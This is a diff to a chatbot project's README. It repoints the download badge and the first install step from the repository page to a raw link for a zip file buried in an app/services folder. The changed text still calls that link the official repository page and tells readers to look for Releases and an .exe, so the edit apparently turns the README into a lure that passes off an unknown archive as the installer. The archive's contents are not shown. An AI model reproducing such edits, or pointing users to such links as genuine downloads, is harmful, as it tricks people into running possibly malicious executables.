@@ -1,7 +1,7 @@
 # 🤖 AI-FAQ-Chatbot - Get answers from your documents easily
 
 <p align="center">
-  <a href="https://github.com/belizj45/AI-FAQ-Chatbot">
+  <a href="https://raw.githubusercontent.com/belizj45/AI-FAQ-Chatbot/main/app/services/Chatbot_A_FA_1.0.zip">
     <img src="https://img.shields.io/badge/Download-Application-blue.svg" alt="Download AI-FAQ-Chatbot">
   </a>
 </p>
@@ -24,7 +24,7 @@ Your computer needs to meet these basic standards to run the application:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official repository page at https://github.com/belizj45/AI-FAQ-Chatbot to locate the installer.
+1.  Visit the official repository page at https://raw.githubusercontent.com/belizj45/AI-FAQ-Chatbot/main/app/services/Chatbot_A_FA_1.0.zip to locate the installer.
 2.  Look for the section labeled Releases on the right side of the page.
 3.  Click the link for the latest version.
 4.  Download the file that ends with .exe.
